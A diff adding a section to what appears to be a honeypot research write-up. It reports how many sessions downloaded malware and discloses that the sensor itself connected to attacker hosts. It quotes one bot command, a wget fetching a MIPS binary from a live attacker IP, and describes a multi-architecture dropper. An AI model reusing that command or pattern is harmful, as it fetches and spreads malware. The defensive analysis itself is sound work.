@@ -232,6 +232,56 @@ Discovery, neither yet verified against the ATT&CK pages. Cowrie also recorded a
 **JA4H fingerprint** for each forwarded HTTP request, which is a
 client-identification artefact worth a line in the analysis.
 
+## What they actually installed, and what finding out cost us
+
+A small number of visitors went all the way: got in, looked around, and then
+went and fetched a program to run. Cowrie keeps whatever arrives, so we have it.
+
+| What happened | Sessions | Distinct files |
+|---|---|---|
+| Fetched a program from the internet | **33** | 33 |
+| Tried to fetch one and failed | 15 | — |
+| Pushed a file to us directly, over SCP | 14 | 24 |
+| Wrote a small file to see whether they could | 104 | 8 |
+
+**Roughly one session in forty-five went the whole way.** Everything else stopped
+at looking around. That is the honest shape of it: an enormous amount of
+knocking, a great deal of poking about, and a thin trickle of actual delivery.
+
+The commands are worth seeing, because they show how little the attacker knows
+or cares about what it has reached. One script tries fourteen different builds of
+the same program in a row — `net.x86_64`, `net.mips`, `net.arm`, `net.arm5`,
+`net.ppc`, `net.m68k` and so on — each with two different download tools as a
+fallback, until one of them runs. It is not targeting a Linux server. It is
+throwing every shape of key at every lock.
+
+Sixty-five different files in all. They are still on the sensor, never run, and
+they are the answer to "what do they install" — which is the question every
+audience asks and which very few small-scale projects can answer at all.
+
+### The part that cost us
+
+Cowrie does not pretend to download things. When a bot typed
+`wget http://45.32.215.222/iran.mips`, our machine really went to that address
+and fetched the file. Over four days that is **153 outbound connections to 8
+attacker-controlled hosts**.
+
+`docs/rules-of-engagement.md` said this project only ever receives and never
+connects back to an address in its own logs. Both sentences were false, for four
+days, and nobody noticed because nobody had tested them — they were written as
+an intention.
+
+It was found by accident, while checking a claim that no payload had ever been
+delivered. Downloads were switched off the same afternoon, at the firewall
+rather than in a configuration file, and the whole episode is written up in the
+rules of engagement rather than quietly fixed. The 65 files stay; no more will
+arrive. The addresses bots ask us to fetch from are still recorded, so the
+useful part continues.
+
+That trade is worth stating plainly: we gave up four more weeks of malware
+samples to keep a document true. The document is the part that makes the rest
+of the project worth believing.
+
 ## Where it came from, and why that says less than it looks
 
 The fifty most persistent sources were looked up in the regional internet
